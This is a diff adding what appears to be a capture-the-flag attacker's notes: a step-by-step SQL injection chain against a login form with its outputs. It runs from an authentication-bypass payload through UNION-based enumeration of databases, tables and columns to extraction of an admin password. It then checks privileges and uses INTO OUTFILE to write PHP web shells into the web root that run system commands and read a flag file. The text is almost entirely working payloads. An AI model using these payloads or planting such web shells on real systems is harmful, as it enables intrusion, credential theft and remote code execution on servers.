@@ -1,0 +1,43 @@
+admin' or 'a'='a' -- -
+success login
+
+' union select 1,2,3,4,5 -- -
+okey
+
+' union select 1,user(),database(),@@version,5 -- -
+
+
+' union select 1,schema_name,3,4,5 from information_schema.schemata -- -
+backup
+
+' union select 1,table_name,table_schema,4,5 from information_schema.tables where table_schema='backup' -- -
+admin_bk
+
+' union select 1,column_name,table_name,table_schema,5 from information_schema.columns where table_name='admin_bk'-- -
+username
+password
+
+' union select 1,username,password,4,5 from backup.admin_bk -- -
+admin	Inl@n3_fre1gh7_adm!n
+
+
+' union select 1,super_priv,3,4,5 from mysql.user -- -
+Y
+
+' union select 1,super_priv,3,4,5 from mysql.user WHERE user="admin"-- -
+
+' union select 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -
+
+' union select 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -	
+
+
+
+' union select "",'<?php system(pwd); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
+
+' union select "",'<?php system("ls /"); ?>', "", "", "" into outfile '/var/www/html/dashboard/shellz.php'-- -
+1 Adam January 1337$ 5% 2 James March 1213$ 8% bin boot dev etc flag_cae1dadcd174.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
+
+' union select "",'<?php system("cat /flag_cae1dadcd174.txt"); ?>', "", "", "" into outfile '/var/www/html/dashboard/flag.php'-- -
+528d6d9cedc2c7aab146ef226e918396
+' union select 1,load_file("/flag_cae1dadcd174.txt"),3,4,5 -- -
+528d6d9cedc2c7aab146ef226e918396
